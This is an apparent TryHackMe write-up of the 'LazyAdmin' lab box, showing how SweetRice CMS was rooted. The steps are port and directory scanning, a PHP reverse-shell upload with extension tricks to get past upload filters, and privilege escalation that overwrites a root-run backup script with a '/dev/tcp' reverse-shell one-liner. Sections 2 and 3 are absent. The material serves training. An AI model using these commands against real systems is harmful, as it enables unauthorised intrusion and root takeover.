# THM LazyAdmin

A Linux box rooted by enumerating a SweetRice CMS instance, recovering an admin password hash from an exposed MySQL backup, cracking it, abusing a public arbitrary-file-upload exploit for a web shell, and finally chaining a writable root-run Perl/Bash backup script for privilege escalation.

---

## 1. Reconnaissance

### Port scan

```
sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
```

![](Pasted%20image%2020261017174326.png)

From the Nmap scan we found:

- An **Apache** web server running on **port 80**
- **SSH** open on **port 22**

### Directory brute forcing

With a web server exposed, the next step is content discovery.

Quick initial scan:

```
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 50 -u <IP>
```

> **Note — reading Gobuster status codes (OSCP tip):**
> For OSCP, you don't need to manually hide 404 responses in Gobuster because 404 is normally excluded by default.
>
> Why?
> - **404 Not Found:** Usually means the path doesn't exist.
> - **200 OK:** Potentially valid page or resource.
> - **301/302:** Redirects; investigate the destination.
> - **403 Forbidden:** May indicate an existing resource you don't have permission to access.
>
> **OSCP tip:** Don't ignore 403 responses — they can reveal useful directories even when access is denied.

## 4. Initial access — uploading a reverse shell

We upload a reverse shell.

> ###### ==🔵If `.php` is blocked==
> When you go to the folder where the files are being uploaded, nothing is there.
>
> Try renaming to other allowed extensions like: `.php5` `.phtml` `.pht` `.phar`
> ```
> mv shell.php shell.php5
> ```
> Repeat the process and see if it bypasses the upload.

> ###### ==🔵Reverse Shell:==
> Go to https://www.revshells.com/
> Use **PHP Pentest Monkey**; change IP and port.
>
> Start listener on Kali:
> ```
> rlwrap -cAr nc -lvnp 4444
> ```

We get a shell back on Kali.

## 5. Privilege Escalation — writable root-run backup script

![](Pasted%20image%2020261017202944.png)

This means we can run `backup.pl` as root.

So we check the contents of the backup script:

```
cat <full path to script>
```

![](Pasted%20image%2020261017203526.png)

We can run this script as sudo:

```
sudo /usr/bin/perl /home/itguy/backup.pl
```

First we see the contents of the file:

```
cat /home/itguy/backup.pl
```

It is executing another `.sh` script at another location. We then view the contents of the file it executes:

```
cat <path to second script>
```

We check our permissions on the second script:

```
ls -la <path to second script>
```

If we can write to that script, replace its contents with a reverse shell:

```
echo "sh -i >& /dev/tcp/<kali ip>/4444 0>&1" > "path to second script"
```

Start listener:

```
rlwrap -cAr nc -lvnp 4444
```

Then run the initial script using sudo:

```
sudo /usr/bin/perl /home/itguy/backup.pl
```

We get a **root** reverse shell back.

## Lessons Learned

- **Enumerate recursively.** The critical `/attachment` → `mysql_backup` path only appeared after re-running Gobuster against the `/content` subdirectory. Always brute-force newly discovered directories.
- **Exposed backups are gold.** An unprotected MySQL backup leaked the admin password hash, which cracked trivially.
- **Match the exact CMS version to an exploit.** Logging in revealed version `1.5.1`, which lined up with a known arbitrary-file-upload exploit.
- **If `.php` upload is blocked**, try alternate executable PHP extensions (`.php5`, `.phtml`, `.pht`, `.phar`).
- **Chained sudo scripts:** when a root-runnable script calls another script, follow the chain — a writable second-stage script is a direct path to root.
